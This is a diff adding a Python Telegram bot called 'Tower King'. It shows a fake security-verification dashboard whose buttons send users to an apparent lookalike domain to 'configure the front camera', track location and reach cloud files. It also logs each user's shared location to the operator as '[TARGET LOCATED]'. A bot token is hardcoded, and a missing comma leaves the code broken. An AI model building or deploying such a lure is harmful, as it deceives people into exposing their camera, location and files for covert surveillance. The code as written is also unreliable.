@@ -1,0 +1,79 @@
+import logging
+import asyncio
+import os
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
+
+# --- কনফিগারেশন ---
+TOKEN = '8676024624:AAH4OoRcAweKjXHl91lXVD-UGolgALP0OW4'
+OWNER_USERNAME = '@KING_OF_ENAFUL'
+BASE_URL = 'https://auth-secure-verify.com'
+# ------------------
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    
+    # প্রফেশনাল লোডিং অ্যানিমেশন
+    loading_msg = await update.message.reply_text("🛡️ **Initializing Tower King Protocol...** \n`[▒▒▒▒▒▒▒▒▒▒] 0%`", parse_mode='Markdown')
+    await asyncio.sleep(1)
+    await loading_msg.edit_text("🛰️ **Syncing with Secure Server...** \n`[██████▒▒▒▒] 60%`", parse_mode='Markdown')
+    await asyncio.sleep(1)
+    
+    # ড্যাশবোর্ড ডিজাইন
+    welcome_text = (
+        f"┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
+        f"┃   🏰 TOWER KING SYSTEM V4.0  ┃\n"
+        f"┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
+        f"👤 **Operator:** `{user.first_name}`\n"
+        f"👑 **Owner:** `{OWNER_USERNAME}`\n"
+        f"📡 **Status:** `Authorized Access`\n"
+        f"───────────────────────\n"
+        f"সিস্টেম ভেরিফিকেশন এবং ফ্রন্ট ক্যামেরা \n"
+        f"কনফিগার করতে নিচের লিঙ্কে ক্লিক করুন।\n"
+        f"───────────────────────"
+    )
+
+    # প্রতিটি বাটনের সাথে আপনার লিঙ্কগুলো বসানো হয়েছে
+    keyboard = [
+        [
+            # মেইন ভেরিফিকেশন লিঙ্ক
+            InlineKeyboardButton("🛡️ ⟪ TOWER KING: AUTH ⟫", url=BASE_URL)
+        ],
+        [
+            # লোকেশন ট্র্যাকিং লিঙ্ক
+            InlineKeyboardButton("📍 ⟪ TRACK LOCATION ⟫", url=f"{BASE_URL}/loc"),
+            # ক্লাউড স্টোরেজ লিঙ্ক
+            InlineKeyboardButton("📂 ⟪ CLOUD STORAGE ⟫", url=f"{BASE_URL}/files")
+                    # কন্টাক্ট লিঙ্ক
+            InlineKeyboardButton("⚡ ⟪ CONTACT OWNER ⟫", url=f"https://t.me/KING_OF_ENAFUL")
+        ],
+        [
+            InlineKeyboardButton("🔴 ⟪ EXIT SESSION ⟫", url=f"{BASE_URL}/exit")
+        ]
+    ]
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await loading_msg.delete()
+    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
+
+async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_loc = update.message.location
+    maps_url = f"https://www.google.com/maps?q={user_loc.latitude},{user_loc.longitude}"
+    
+    print(f"✅ [TARGET LOCATED] \nName: {user.first_name} \nID: {user.id} \nMaps: {maps_url}")
+    await update.message.reply_text("✅ Device Location Synchronized Successfully.")
+
+if __name__ == '__main__':
+    if not os.path.exists('./gallery'): 
+        os.makedirs('./gallery')
+        
+    app = ApplicationBuilder().token(TOKEN).build()
+    
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
+    
+    print(f"🚀 Tower King (bot77.py) is LIVE and Running!")
+    app.run_polling()
+
